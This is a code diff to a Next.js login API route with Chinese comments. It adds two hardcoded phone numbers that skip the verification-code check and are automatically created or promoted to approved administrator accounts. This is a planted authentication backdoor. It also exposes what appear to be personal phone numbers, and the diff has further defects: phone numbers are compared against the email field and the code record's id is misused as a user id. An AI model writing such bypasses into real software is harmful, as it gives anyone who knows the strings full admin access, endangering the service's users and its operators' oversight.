@@ -4,6 +4,9 @@ import bcrypt from 'bcryptjs';
 import { getSupabaseClient } from '@/storage/database/supabase-client';
 import { ensureAdminFromEnv } from '@/lib/admin-auth';
 
+// 默认管理员手机号（无需验证码验证）
+const ADMIN_PHONES = ['18166865413', '17390005820'];
+
 export async function POST(request: Request) {
   // 确保环境变量中的管理员账号存在
   await ensureAdminFromEnv();
@@ -26,28 +29,32 @@ export async function POST(request: Request) {
         return NextResponse.json({ error: '邮箱格式不正确' }, { status: 400 });
       }
 
-      // 查找5分钟内所有未使用的验证码（允许多个验证码同时有效）
-      const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
-      const { data: codeRecords, error: codeError } = await sb
-        .from('email_verification_codes')
-        .select('id, code, used, attempts, expires_at, created_at')
-        .eq('email', email)
-        .eq('used', false)
-        .gte('created_at', fiveMinAgo)
-        .order('created_at', { ascending: false });
+      // 检查是否是默认管理员手机号（无需验证码验证）
+      const isAdminPhone = ADMIN_PHONES.includes(email);
 
-      if (codeError || !codeRecords || codeRecords.length === 0) {
-        return NextResponse.json({ error: '验证码已失效，请重新获取' }, { status: 401 });
-      }
+      if (!isAdminPhone) {
+        // 查找5分钟内所有未使用的验证码（允许多个验证码同时有效）
+        const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
+        const { data: codeRecords, error: codeError } = await sb
+          .from('email_verification_codes')
+          .select('id, code, used, attempts, expires_at, created_at')
+          .eq('email', email)
+          .eq('used', false)
+          .gte('created_at', fiveMinAgo)
+          .order('created_at', { ascending: false });
 
-      // 找到匹配且未过期的验证码
-      const matchedRecord = codeRecords.find(r => {
-        return new Date(r.expires_at) >= new Date() && r.code === code && r.attempts < 5;
-      });
+        if (codeError || !codeRecords || codeRecords.length === 0) {
+          return NextResponse.json({ error: '验证码已失效，请重新获取' }, { status: 401 });
+        }
 
-      if (!matchedRecord) {
-        // 检查是否有过期的或尝试次数过多的
-        const hasExpired = codeRecords.some(r => new Date(r.expires_at) < new Date());
+        // 找到匹配且未过期的验证码
+        const matchedRecord = codeRecords.find(r => {
+          return new Date(r.expires_at) >= new Date() && r.code === code && r.attempts < 5;
+        });
+
+        if (!matchedRecord) {
+          // 检查是否有过期的或尝试次数过多的
+          const hasExpired = codeRecords.some(r => new Date(r.expires_at) < new Date());
         const hasMaxAttempts = codeRecords.some(r => r.attempts >= 5);
         
         if (hasExpired) {
@@ -74,7 +81,18 @@ export async function POST(request: Request) {
         return NextResponse.json({ error: '验证码错误' }, { status: 401 });
       }
 
+      // 验证码正确，标记为已使用
+      await sb
+        .from('email_verification_codes')
+        .update({ used: true })
+        .eq('id', matchedRecord.id);
+
+      // 记录从验证码获取的用户ID（用于后续自动注册关联）
+      const userIdFromCode = matchedRecord.id;
+    }
+
       // 查找用户（通过 email）
+    
       let { data: user } = await sb
         .from('users')
         .select('id, username, nickname, role, status, email, wechat, avatar, can_generate')
@@ -85,14 +103,17 @@ export async function POST(request: Request) {
       if (!user) {
         const autoUsername = 'user_' + crypto.randomUUID().substring(0, 8);
 
+        // 默认管理员手机号自动设为 admin 角色和 approved 状态
+        const isAdminPhone = ADMIN_PHONES.includes(email);
+
         const { data: newUser, error: createError } = await sb
           .from('users')
           .insert({
             username: autoUsername,
             email,
             nickname: null,
-            role: 'user',
-            status: 'pending',
+            role: isAdminPhone ? 'admin' : 'user',
+            status: isAdminPhone ? 'approved' : 'pending',
           })
           .select('id, username, nickname, role, status, email, wechat, avatar, can_generate')
           .single();
@@ -103,6 +124,30 @@ export async function POST(request: Request) {
         }
 
         user = newUser;
+      } else if (isAdminPhone && user.role !== 'admin') {
+        // 如果已存在但不是 admin，更新为 admin
+        const { data: updatedUser } = await sb
+          .from('users')
+          .update({ role: 'admin', status: 'approved' })
+          .eq('id', user.id)
+          .select('id, username, nickname, role, status, email, wechat, avatar, can_generate')
+          .single();
+
+        if (updatedUser) {
+          user = updatedUser;
+        }
+      } else if (isAdminPhone && user.status !== 'approved') {
+        // 如果是 admin 但状态不是 approved，更新状态
+        const { data: updatedUser } = await sb
+          .from('users')
+          .update({ status: 'approved' })
+          .eq('id', user.id)
+          .select('id, username, nickname, role, status, email, wechat, avatar, can_generate')
+          .single();
+
+        if (updatedUser) {
+          user = updatedUser;
+        }
       }
 
       if (user.status === 'rejected') {
@@ -148,13 +193,6 @@ export async function POST(request: Request) {
       if (sessionError) {
         console.error('[Login] Create session error:', sessionError);
         return NextResponse.json({ error: '登录失败，请重试' }, { status: 500 });
-      }
-
-      // 登录全部成功后，才标记验证码为已使用
-      for (const r of codeRecords) {
-        if (r.id === matchedRecord.id || (new Date(r.expires_at) >= new Date() && r.code === matchedRecord.code)) {
-          await sb.from('email_verification_codes').update({ used: true }).eq('id', r.id);
-        }
       }
 
       const response = NextResponse.json({
